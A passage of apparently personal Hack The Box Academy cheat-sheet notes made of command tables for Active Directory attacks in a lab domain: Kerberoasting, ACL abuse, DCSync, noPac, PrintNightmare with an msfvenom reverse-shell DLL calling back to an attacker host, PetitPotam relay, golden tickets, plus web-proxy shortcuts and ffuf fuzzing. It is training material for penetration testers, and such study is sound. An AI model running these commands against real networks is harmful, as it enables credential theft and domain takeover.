| `GetUserSPNs.py -h`                                                                                                                                                                                             | Impacket tool used to display the options and functionality of GetUserSPNs.py from a Linux-based host.                                                                                     |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday`                                                                                                                                                | Impacket tool used to get a list of SPNs on the target Windows domain from a Linux-based host.                                                                                             |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request`                                                                                                                                       | Impacket tool used to download/request (-request) all TGS tickets for offline processing from a Linux-based host.                                                                          |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev`                                                                                                                           | Impacket tool used to download/request (-request-user) a TGS ticket for a specific user account (sqldev) from a Linux-based host.                                                          |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs`                                                                                                    | Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.                                  |
| `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force`                                                                                                                                          | Attempts to crack the Kerberos (-m 13100) ticket hash (sqldev_tgs) using hashcat and a wordlist (rockyou.txt) from a Linux-based host.                                                     |
| `setspn.exe -Q */*`                                                                                                                                                                                             | Used to enumerate SPNs in a target Windows domain from a Windows-based host.                                                                                                               |
| `Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`                               | PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.                                                                                    |
| `setspn.exe -T INLANEFREIGHT.LOCAL -Q \*/\* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $\_.Context.PostContext[0].Trim() }` | Used to download/request all TGS tickets from a WIndows-based host.                                                                                                                        |
| `mimikatz # base64 /out:true`                                                                                                                                                                                   | Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host.                                                                                        |
| `kerberos::list /export`                                                                                                                                                                                        | Mimikatz command used to extract the TGS tickets from a Windows-based host.                                                                                                                |
| `echo "<base64 blob>" \| tr -d \\n`                                                                                                                                                                             | Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.                                                                                                        |
| `cat encoded_file \| base64 -d > sqldev.kirbi`                                                                                                                                                                  | Used to output a file (encoded_file) into a .kirbi file in base64 (base64 -d > sqldev.kirbi) format from a Linux-based host.                                                               |
| `python2.7 kirbi2john.py sqldev.kirbi`                                                                                                                                                                          | Used to extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host.                                                                                   |
| `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`                                                                                                                   | Used to modify the crack_file for Hashcat from a Linux-based host.                                                                                                                         |
| `cat sqldev_tgs_hashcat`                                                                                                                                                                                        | Used to view the prepared hash from a Linux-based host.                                                                                                                                    |
| `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`                                                                                                                                          | Used to crack the prepared Kerberos ticket hash (sqldev_tgs_hashcat) using a wordlist (rockyou.txt) from a Linux-based host.                                                               |
| `Import-Module .\PowerView.ps1 Get-DomainUser * -spn \| select samaccountname`                                                                                                                                  | Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.                                                                                                          |
| `Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat`                                                                                                                                        | PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.                                             |
| `Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation`                                                                                             | Exports all TGS tickets to a .CSV file (ilfreight_tgs.csv) from a Windows-based host.                                                                                                      |
| `cat .\ilfreight_tgs.csv`                                                                                                                                                                                       | Used to view the contents of the .csv file from a Windows-based host.                                                                                                                      |
| `.\Rubeus.exe`                                                                                                                                                                                                  | Used to view the options and functionality possible with the tool Rubeus. Performed from a Windows-based host.                                                                             |
| `.\Rubeus.exe kerberoast /stats`                                                                                                                                                                                | Used to check the kerberoast stats (/stats) within the target Windows domain from a Windows-based host.                                                                                    |
| `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`                                                                                                                                                    | Used to request/download TGS tickets for accounts with the admin count set to 1 then formats the output in an easy to view & crack manner (/nowrap) . Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /user:testspn /nowrap`                                                                                                                                                                 | Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.         |
| `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes`                                                                                                          | PowerView tool used to check the msDS-SupportedEncryptionType attribute associated with a specific user account (testspn). Performed from a Windows-based host.                            |
| `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt`                                                                                                                                                | Used to attempt to crack the ticket hash using a wordlist (rockyou.txt) from a Linux-based host .                                                                                          |

**ACL Enumeration & Tactics**

| Command                                                                                                                                                                                                                                                                                                | Description                                                                                                                                                                                                                               |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Find-InterestingDomainAcl`                                                                                                                                                                                                                                                                            | PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built-in objects from a Windows-based host.                                                                                      |
| `Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley`                                                                                                                                                                                                                                          | Used to import PowerView and retrieve the SID of a specific user account (wley) from a Windows-based host.                                                                                                                                |
| `Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}`                                                                                                                                                                                                                                | Finds all Windows domain objects that the user has rights over by mapping the user's SID to the SecurityIdentifier property from a Windows-based host.                                                                                    |
| `$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl` | Performs a reverse search & maps to a GUID value from a Windows-based host.                                                                                                                                                               |
| `Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid}`                                                                                                                                                                                                                  | Discovers a domain object's ACL by performing a search based on GUIDs (-ResolveGUIDs) from a Windows-based host.                                                                                                                          |
| `Get-ADUser -Filter * \| Select-Object -ExpandProperty SamAccountName > ad_users.txt`                                                                                                                                                                                                                  | Discovers a group of user accounts in a target Windows domain and adds the output to a text file (ad_users.txt) from a Windows-based host.                                                                                                |
| `foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" \| Select-Object Path -ExpandProperty Access \| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}`                                                      | Retrieves ACL information for each domain user in a target Windows domain by feeding each list of a text file (ad_users.txt) to the Get-ADUser cmdlet, then enumerates access rights of those users. Performed from a Windows-based host. |
| `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)`                                                                                                                         | Creates a PSCredential Object from a Windows-based host.                                                                                                                                                                                  |
| `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`                                                                                                                                                                                                                     | Creates a SecureString Object from a Windows-based host.                                                                                                                                                                                  |
| `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`                                                                                                                                                                                            | PowerView tool used to change the password of a specific user (damundsen) on a target Windows domain from a Windows-based host.                                                                                                           |
| `Get-ADGroup -Identity "Help Desk Level 1" -Properties * \| Select -ExpandProperty Members`                                                                                                                                                                                                            | PowerView tool used to view the members of a target security group (Help Desk Level 1) from a Windows-based host.                                                                                                                         |
| `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`                                                                                                                                                                                                 | PowerView tool used to add a specific user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.                                                                             |
| `Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName`                                                                                                                                                                                                                             | PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.                                          |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`                                                                                                                                                                                         | PowerView tool used to create a fake Service Principal Name given a specific user (adunn) from a Windows-based host.                                                                                                                      |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`                                                                                                                                                                                                             | PowerView tool used to remove the fake Service Principal Name created during the attack from a Windows-based host.                                                                                                                        |
| `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`                                                                                                                                                                                              | PowerView tool used to remove a specific user (damundsen) from a specific security group (Help Desk Level 1) from a Windows-based host.                                                                                                   |
| `ConvertFrom-SddlString`                                                                                                                                                                                                                                                                               | PowerShell cmdlet used to convert an SDDL string into a readable format. Performed from a Windows-based host.                                                                                                                             |

**DCSync**

| Command                                                                                                                                                                                                                                                                                                     | Description                                                                                                                                                                                                           |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-DomainUser -Identity adunn                                                                                                                                                                                                                                                                             | select samaccountname,objectsid,memberof,useraccountcontrol                                                                                                                                                           | fl` | PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host. |
| `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl` | Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool Get-ObjectAcl to check a specific user's replication rights. Performed from a Windows-based host.       |
| `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss`                                                                                                                                                                                                          | Impacket tool used to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (172.16.5.5) and save the extracted hashes to a file (inlanefreight_hashes). Performed from a Linux-based host. |
| `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`                                                                                                                                                                                                                  | Uses Mimikatz to perform a DCSync attack from a Windows-based host.                                                                                                                                                   |

**Privileged Access**

| Command                                                                                                                                  | Description                                                                                                            |
| ---------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`                                                | PowerView tool to enumerate Remote Desktop Users group on a Windows target from a Windows-based host.                  |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"`                                             | PowerView tool to enumerate Remote Management Users group on a Windows target from a Windows-based host.               |
| `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force`                                                                     | Creates a variable with a plaintext password for a user on a Windows-based host.                                       |
| `$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)`                                       | Creates a PSCredential object with a username and password for a target domain account from a Windows-based host.      |
| `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred`                                                                        | Establishes a PowerShell session with a target over the network using specified credentials from a Windows-based host. |
| `evil-winrm -i 10.129.201.234 -u forend`                                                                                                 | Establishes a PowerShell session with a Windows target from a Linux-based host using WinRM.                            |
| `Import-Module .\PowerUpSQL.ps1`                                                                                                         | Imports the PowerUpSQL tool from a Windows-based host.                                                                 |
| `Get-SQLInstanceDomain`                                                                                                                  | Enumerates SQL server instances from a Windows-based host using PowerUpSQL.                                            |
| `Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'` | Connects to a SQL server and queries the version from a Windows-based host using PowerUpSQL.                           |
| `mssqlclient.py`                                                                                                                         | Displays functionality and options provided with mssqlclient.py from a Linux-based host.                               |
| `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`                                                                      | Connects to a MSSQL server from a Linux-based host using Impacket.                                                     |
| `SQL> help`                                                                                                                              | Displays mssqlclient.py options once connected to a MSSQL server.                                                      |
| `SQL> enable_xp_cmdshell`                                                                                                                | Enables xp_cmdshell stored procedure for executing OS commands via the database from a Linux-based host.               |
| `xp_cmdshell whoami /priv`                                                                                                               | Enumerates rights on a system using xp_cmdshell.                                                                       |

**NoPac**

| Command                                                                                                                                                                                       | Description                                                                                                                                                          |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sudo git clone https://github.com/Ridter/noPac.git`                                                                                                                                          | Clones the noPac exploit repository using git from a Linux-based host.                                                                                               |
| `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap`                                                                                                    | Runs scanner.py to check if a target system is vulnerable to noPac/Sam_The_Admin from a Linux-based host.                                                            |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap`                                          | Exploits the noPac/Sam_The_Admin vulnerability to gain a SYSTEM shell from a Linux-based host.                                                                       |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator` | Exploits the noPac/Sam_The_Admin vulnerability to perform a DCSync attack against the built-in Administrator account on a Domain Controller from a Linux-based host. |

**PrintNightmare**

| Command                                                                                                                           | Description                                                                                                                               |
| --------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `git clone https://github.com/cube0x0/CVE-2021-1675.git`                                                                          | Clone PrintNightmare exploit repository using git from a Linux-based host.                                                                |
| `pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install`                    | Ensure the exploit author's (cube0x0) version of Impacket is installed and uninstall any previous Impacket version on a Linux-based host. |
| `rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'`                                                                               | Check if a Windows target has MS-RPRN & MS-PAR exposed from a Linux-based host.                                                           |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll`                       | Generate a DLL payload for gaining a shell session from a Windows-based host.                                                             |
| `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll`                                                               | Create an SMB server and host a shared folder (CompData) with the DLL payload from a Linux-based host.                                    |
| `sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'` | Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.                                    |

**PetitPotam**

| Command                                                                                                                                                            | Description                                                                                                                                         |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`               | Use Impacket tool to create an NTLM relay, specifying the web enrollment URL for the Certificate Authority host. Performed from a Linux-based host. |
| `git clone https://github.com/topotam/PetitPotam.git`                                                                                                              | Clone the PetitPotam exploit repository using git from a Linux-based host.                                                                          |
| `python3 PetitPotam.py 172.16.5.225 172.16.5.5`                                                                                                                    | Execute the PetitPotam exploit by specifying the IP address of the attack host and the target Domain Controller. Performed from a Linux-based host. |
| `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache`                                    | Use gettgtpkinit.py to request a TGT ticket for the Domain Controller from a Linux-based host.                                                      |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`                                      | Perform a DCSync attack to retrieve NTLM password hashes from the target Windows domain. Performed from a Linux-based host.                         |
| `klist`                                                                                                                                                            | View the contents of the ccache file. Performed from a Linux-based host.                                                                            |
| `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`                  | Submit TGS requests using getnthash.py from a Linux-based host.                                                                                     |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | Extract hashes from NTDS.dit using a DCSync attack and a captured hash. Performed from a Linux-based host.                                          |

**Miscellaneous Misconfigurations**

| Command                                                                                       | Description                                                                                                                                  |
| --------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| `Import-Module .\SecurityAssessment.ps1`                                                      | Import the module Security Assessment.ps1. Performed from a Windows-based host.                                                              |
| `Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`                           | Use SecurityAssessment.ps1 based tool to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.             |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`                                       | Resolve all records in a DNS zone over LDAP from a Linux-based host.                                                                         |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r`                                    | Resolve unknown records in a DNS zone by performing an A query from a Linux-based host.                                                      |
| `Get-DomainUser \* \| Select-Object samaccountname,description`                               | Use PowerView tool to display the description field of select objects on a target Windows domain from a Windows-based host.                  |
| `Get-DomainUser -UACFilter PASSWD_NOTREQD \| Select-Object samaccountname,useraccountcontrol` | Use PowerView tool to check for the PASSWD_NOTREQD setting of select objects on a target Windows domain from a Windows-based host.           |
| `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`                                     | List the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host. |

**Group Policy Enumeration & Attacks**

| Command                                                               | Description                                                                                                                                                       |
| --------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`             | Tool used to decrypt a captured group policy preference password from a Linux-based host.                                                                         |
| `crackmapexec smb -L \| grep gpp`                                     | Locates and retrieves a group policy preference password using CrackMapExec, then filters the output using grep. Performed from a Linux-based host.               |
| `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin` | Locates and retrieves any credentials stored in the SYSVOL share of a Windows target using CrackMapExec from a Linux-based host.                                  |
| `Get-DomainGPO \| select displayname`                                 | PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.                                                                  |
| `Get-GPO -All \| Select DisplayName`                                  | PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.                                                                              |
| `$sid=Convert-NameToSid "Domain Users"`                               | Creates a variable called $sid that is set equal to the Convert-NameToSid tool and specifies the group account Domain Users. Performed from a Windows-based host. |
| `Get-DomainGPO \| Get-ObjectAcl \| ?{$_.SecurityIdentifier -eq $sid`  | PowerView tool used to check if the Domain Users (eq $sid) group has any rights over one or more GPOs. Performed from a Windows-based host.                       |
| `Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`                  | PowerShell cmd-let used to display the name of a GPO given a GUID. Performed from a Windows-based host.                                                           |

**ASREPRoasting**

| Command                                                                                                  | Description                                                                                                                                                                           |
| -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl` | PowerView based tool used to search for the DONT_REQ_PREAUTH value across in user accounts in a target Windows domain. Performed from a Windows-based host.                           |
| `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`                                          | Uses Rubeus to perform an AS-REP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.                                                             |
| `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt`                                      | Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host.                                                                 |
| `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`                               | Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host. |

**Trust Relationships - Child > Parent Trusts**

| Command                                                                                                                                                                                                                         | Description                                                                                                                                  |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| `Import-Module activedirectory`                                                                                                                                                                                                 | Used to import the Active Directory module. Performed from a Windows-based host.                                                             |
| `Get-ADTrust -Filter *`                                                                                                                                                                                                         | PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.                     |
| `Get-DomainTrust`                                                                                                                                                                                                               | PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.                         |
| `Get-DomainTrustMapping`                                                                                                                                                                                                        | PowerView tool used to perform a domain trust mapping from a Windows-based host.                                                             |
| `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \| select SamAccountName`                                                                                                                                                 | PowerView tools used to enumerate users in a target child domain from a Windows-based host.                                                  |
| `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`                                                                                                                                                                             | Uses Mimikatz to obtain the KRBTGT account's NT Hash from a Windows-based host.                                                              |
| `Get-DomainSID`                                                                                                                                                                                                                 | PowerView tool used to get the SID for a target child domain from a Windows-based host.                                                      |
| `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid`                                                                                                               | PowerView tool used to obtain the Enterprise Admins group's SID from a Windows-based host.                                                   |
| `ls \\academy-ea-dc01.inlanefreight.local\c$`                                                                                                                                                                                   | Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.                      |
| `mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt` | Uses Mimikatz to create a Golden Ticket from a Windows-based host.                                                                           |
| `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`            | Uses Rubeus to create a Golden Ticket from a Windows-based host.                                                                             |
| `mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm`                                                                                                                                                                        | Uses Mimikatz to perform a DCSync attack from a Windows-based host.                                                                          |
| `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`                                                                                                                      | Impacket tool used to perform a DCSync attack from a Linux-based host.                                                                       |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`                                                                                                                                                       | Impacket tool used to perform a SID Brute forcing attack from a Linux-based host.                                                            |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"`                                                                                                                                  | Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.                                                   |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"`                                                                                                                        | Impacket tool used to retrieve the SID of a target Windows domain and attach it to the Enterprise Admin group's RID from a Linux-based host. |
| `ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker`                | Impacket tool used to create a Golden Ticket from a Linux-based host.                                                                        |
| `export KRB5CCNAME=hacker.ccache`                                                                                                                                                                                               | Used to set the KRB5CCNAME Environment Variable from a Linux-based host.                                                                     |
| `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`                                                                                                          | Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.                                     |
| `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`                                                                                                                                           | Impacket tool that automatically performs an attack that escalates from child to parent domain.                                              |

**Trust Relationships - Cross-Forest**

| Command                                                                                                        | Description                                                                                                                                |
| -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName`                                  | PowerView tool used to enumerate accounts for associated SPNs from a Windows-based host.                                                   |
| `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof`           | PowerView tool used to enumerate the mssqlsvc account from a Windows-based host.                                                           |
| `.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`                                | Uses Rubeus to perform a Kerberoasting Attack against a target Windows domain (/domain:FREIGHTLOGISTICS.local) from a Windows-based host.  |
| `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`                                                  | PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.                             |
| `Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator` | PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.                                          |
| `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`                       | Impacket tool used to request (-request) the TGS ticket of an account in a target Windows domain (-target-domain) from a Linux-based host. |
| `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`                   | Runs the Python implementation of BloodHound against a target Windows domain from a Linux-based host.                                      |
| `zip -r ilfreight_bh.zip *.json`                                                                               | Used to compress multiple files into 1 single .zip file to be uploaded into the BloodHound GUI.                                            |

### Complete

[Completion Link](https://academy.hackthebox.com/achievement/713396/143)

## Web Proxies

### Cheatsheet

**Burp Shortcuts**

| Shortcut         | Description      |
| ---------------- | ---------------- |
| `[CTRL+R]`       | Send to repeater |
| `[CTRL+SHIFT+R]` | Go to repeater   |
| `[CTRL+I]`       | Send to intruder |
| `[CTRL+SHIFT+I]` | Go to intruder   |
| `[CTRL+U]`       | URL encode       |
| `[CTRL+SHIFT+U]` | URL decode       |

**ZAP Shortcuts**

| Shortcut   | Description              |
| ---------- | ------------------------ |
| `[CTRL+B]` | Toggle intercept on/off  |
| `[CTRL+R]` | Go to replacer           |
| `[CTRL+E]` | Go to encode/decode/hash |

**Firefox Shortcuts**

| Shortcut         | Description        |
| ---------------- | ------------------ |
| `[CTRL+SHIFT+R]` | Force Refresh Page |

### Complete

[Completion Link](https://academy.hackthebox.com/achievement/713396/110)

## FFuF

### Cheatsheet

**Ffuf**

| Command                                                                                                                                                         | Description              |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------ |
| `ffuf -h`                                                                                                                                                       | ffuf help                |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`                                                                                                       | Directory Fuzzing        |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`                                                                                                  | Extension Fuzzing        |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`                                                                                              | Page Fuzzing             |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`                                                              | Recursive Fuzzing        |
| `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/`                                                                                                      | Sub-domain Fuzzing       |
| `ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`                                                                     | VHost Fuzzing            |
| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`                                                                   | Parameter Fuzzing - GET  |
| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Parameter Fuzzing - POST |
